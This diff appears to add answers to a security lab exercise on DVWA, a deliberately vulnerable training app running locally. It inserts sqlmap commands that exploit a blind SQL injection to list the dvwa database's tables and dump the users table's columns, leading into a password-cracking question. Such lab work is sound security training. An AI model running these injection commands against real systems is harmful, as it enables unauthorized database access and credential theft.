@@ -26,6 +26,17 @@ sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#
 
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
+## Getting all tables:
+Running injection code :
+```sh
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=qq1794g49n0psqntskebagqeou" -D dvwa --tables
+```
+
+## Getting all users information:
+Running injection code :
+```sh
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=qq1794g49n0psqntskebagqeou" --columns -T users --batch  
+```
 
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
